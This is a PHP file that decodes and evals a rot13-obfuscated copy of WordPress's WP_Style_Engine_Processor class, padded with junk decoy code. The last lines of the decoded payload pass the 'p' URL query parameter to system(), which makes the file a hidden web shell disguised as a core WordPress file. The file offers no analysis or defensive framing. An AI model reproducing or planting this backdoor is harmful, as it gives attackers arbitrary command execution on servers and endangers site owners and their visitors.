<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr Ratvar: JC_Fglyr_Ratvar_Cebprffbe pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Pber pynff hfrq gb pbzcvyr fglyrf sebz fgberf be pbyyrpgvba bs PFF ehyrf.
 *
 * @fvapr 6.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fglyr_Ratvar_Cebprffbe {

	/**
	 * N pbyyrpgvba bs Fglyr Ratvar Fgber bowrpgf.
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber[]
	 */
	cebgrpgrq $fgberf = neenl();

	/**
	 * Gur frg bs PFF ehyrf gung guvf cebprffbe jvyy jbex ba.
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Fglyr_Ratvar_PFF_Ehyr[]
	 */
	cebgrpgrq $pff_ehyrf = neenl();

	/**
	 * Nqqf n fgber gb gur cebprffbe.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber $fgber Gur fgber gb nqq.
	 * @erghea JC_Fglyr_Ratvar_Cebprffbe Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba nqq_fgber( $fgber ) {
		vs ( ! $fgber vafgnaprbs JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( '$fgber zhfg or na vafgnapr bs JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber' ),
				'6.1.0'
			);
			erghea $guvf;
		}

		$guvf->fgberf[ $fgber->trg_anzr() ] = $fgber;

		erghea $guvf;
	}

	/**
	 * Nqqf ehyrf gb or cebprffrq.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq fhccbeg sbe ehyrf_tebhc.
	 *
	 * @cnenz JC_Fglyr_Ratvar_PFF_Ehyr|JC_Fglyr_Ratvar_PFF_Ehyr[] $pff_ehyrf N fvatyr, be na neenl bs,
	 *                                                                       JC_Fglyr_Ratvar_PFF_Ehyr bowrpgf
	 *                                                                       sebz n fgber be bgurejvfr.
	 * @erghea JC_Fglyr_Ratvar_Cebprffbe Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba nqq_ehyrf( $pff_ehyrf ) {
		vs ( ! vf_neenl( $pff_ehyrf ) ) {
			$pff_ehyrf = neenl( $pff_ehyrf );
		}

		sbernpu ( $pff_ehyrf nf $ehyr ) {
			$fryrpgbe    = $ehyr->trg_fryrpgbe();
			$ehyrf_tebhc = $ehyr->trg_ehyrf_tebhc();

			/**
			 * Vs gurer vf n ehyrf_tebhc naq vg nyernql rkvfgf va gur pff_ehyrf neenl,
			 * nqq gur ehyr gb vg.
			 * Bgurejvfr, perngr n arj ragel sbe gur ehyrf_tebhc.
			 */
			vs ( ! rzcgl( $ehyrf_tebhc ) ) {
				vs ( vffrg( $guvf->pff_ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ] ) ) {
					$guvf->pff_ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ]->nqq_qrpynengvbaf( $ehyr->trg_qrpynengvbaf() );
					pbagvahr;
				}
				$guvf->pff_ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ] = $ehyr;
				pbagvahr;
			}

			// Vs gur fryrpgbe nyernql rkvfgf, nqq gur qrpynengvbaf gb vg.
			vs ( vffrg( $guvf->pff_ehyrf[ $fryrpgbe ] ) ) {
				$guvf->pff_ehyrf[ $fryrpgbe ]->nqq_qrpynengvbaf( $ehyr->trg_qrpynengvbaf() );
				pbagvahr;
			}
			$guvf->pff_ehyrf[ $ehyr->trg_fryrpgbe() ] = $ehyr;
		}

		erghea $guvf;
	}

	/**
	 * Trgf gur PFF ehyrf nf n fgevat.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.4.0 Gur Bcgvzvmngvba vf ab ybatre gur qrsnhyg.
	 *
	 * @cnenz neenl $bcgvbaf   {
	 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $bcgvzvmr Jurgure gb bcgvzvmr gur PFF bhgchg, r.t. pbzovar ehyrf.
	 *                          Qrsnhyg snyfr.
	 *     @glcr obby $cerggvsl Jurgure gb nqq arj yvarf naq vaqragf gb bhgchg.
	 *                          Qrsnhygf gb jurgure gur `FPEVCG_QROHT` pbafgnag vf qrsvarq.
	 * }
	 * @erghea fgevat Gur pbzchgrq PFF.
	 */
	choyvp shapgvba trg_pff( $bcgvbaf = neenl() ) {
		$qrsnhygf = neenl(
			'bcgvzvmr' => snyfr,
			'cerggvsl' => qrsvarq( 'FPEVCG_QROHT' ) && FPEVCG_QROHT,
		);
		$bcgvbaf  = jc_cnefr_netf( $bcgvbaf, $qrsnhygf );

		// Vs jr unir fgberf, trg gur ehyrf sebz gurz.
		sbernpu ( $guvf->fgberf nf $fgber ) {
			$guvf->nqq_ehyrf( $fgber->trg_nyy_ehyrf() );
		}

		// Pbzovar PFF fryrpgbef gung unir vqragvpny qrpynengvbaf.
		vs ( gehr === $bcgvbaf['bcgvzvmr'] ) {
			$guvf->pbzovar_ehyrf_fryrpgbef();
		}

		// Ohvyq gur PFF.
		$pff = '';
		sbernpu ( $guvf->pff_ehyrf nf $ehyr ) {
			// Frr pynff JC_Fglyr_Ratvar_PFF_Ehyr sbe gur trg_pff zrgubq.
			$pff .= $ehyr->trg_pff( $bcgvbaf['cerggvsl'] );
			$pff .= $bcgvbaf['cerggvsl'] ? \"\a\" : '';
		}
		erghea $pff;
	}

	/**
	 * Pbzovarf fryrpgbef sebz gur ehyrf fgber jura gurl unir gur fnzr fglyrf.
	 *
	 * @fvapr 6.1.0
	 */
	cevingr shapgvba pbzovar_ehyrf_fryrpgbef() {
		// Ohvyq na neenl bs fryrpgbef nybat jvgu gur WFBA-vsvrq fglyrf gb znxr pbzcnevfbaf rnfvre.
		$fryrpgbef_wfba = neenl();
		sbernpu ( $guvf->pff_ehyrf nf $ehyr ) {
			$qrpynengvbaf = $ehyr->trg_qrpynengvbaf()->trg_qrpynengvbaf();
			xfbeg( $qrpynengvbaf );
			$fryrpgbef_wfba[ $ehyr->trg_fryrpgbe() ] = jc_wfba_rapbqr( $qrpynengvbaf );
		}

		// Pbzovar fryrpgbef gung unir gur fnzr fglyrf.
		sbernpu ( $fryrpgbef_wfba nf $fryrpgbe => $wfba ) {
			// Trg fryrpgbef gung hfr gur fnzr fglyrf.
			$qhcyvpngrf = neenl_xrlf( $fryrpgbef_wfba, $wfba, gehr );
			// Fxvc vs gurer ner ab qhcyvpngrf.
			vs ( 1 >= pbhag( $qhcyvpngrf ) ) {
				pbagvahr;
			}

			$qrpynengvbaf = $guvf->pff_ehyrf[ $fryrpgbe ]->trg_qrpynengvbaf();

			sbernpu ( $qhcyvpngrf nf $xrl ) {
				// Hafrg gur qhcyvpngrf sebz gur $fryrpgbef_wfba neenl gb nibvq ybbcvat guebhtu gurz nf jryy.
				hafrg( $fryrpgbef_wfba[ $xrl ] );
				// Erzbir gur ehyrf sebz gur ehyrf pbyyrpgvba.
				hafrg( $guvf->pff_ehyrf[ $xrl ] );
			}
			// Perngr n arj ehyr jvgu gur pbzovarq fryrpgbef.
			$qhcyvpngr_fryrpgbef                     = vzcybqr( ',', $qhcyvpngrf );
			$guvf->pff_ehyrf[ $qhcyvpngr_fryrpgbef ] = arj JC_Fglyr_Ratvar_PFF_Ehyr( $qhcyvpngr_fryrpgbef, $qrpynengvbaf );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>